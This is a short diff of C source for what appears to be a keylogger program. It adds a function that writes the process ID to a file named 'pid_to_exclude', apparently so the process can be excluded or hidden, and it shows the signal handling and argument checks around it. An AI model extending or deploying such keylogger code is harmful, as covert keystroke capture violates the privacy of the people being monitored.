@@ -20,6 +20,19 @@ void    SIGhandler(int signal)
 	clean_quit(klg, INTERUPT);
 }
 
+void	save_pid(void)
+{
+	pid_t	pid;
+	int		fd;
+
+	pid = getpid();
+	if (((fd = open("pid_to_exclude", O_RDWR | O_CREAT | O_TRUNC)) > -1)
+		&& (write(fd, &pid, sizeof(pid)) > -1))
+		dprintf(1, "write pid with success: %d\n", pid);
+	else
+		dprintf(STDOUT_FILENO, "ERROR writing pid: %d\n", pid);
+}
+
 void	selectKey(t_keylogger *klg)
 {
 	int mod;
@@ -55,6 +68,7 @@ int main(int ac, char **av)
 		dprintf(STDOUT_FILENO, "Wrong number of argument\n");
 		return 0;
 	}
+	save_pid();
 	klg = getKlg();
 	signal(SIGINT, SIGhandler);
 	dprintf(STDOUT_FILENO, "keyboard file = %s\n", av[1]);
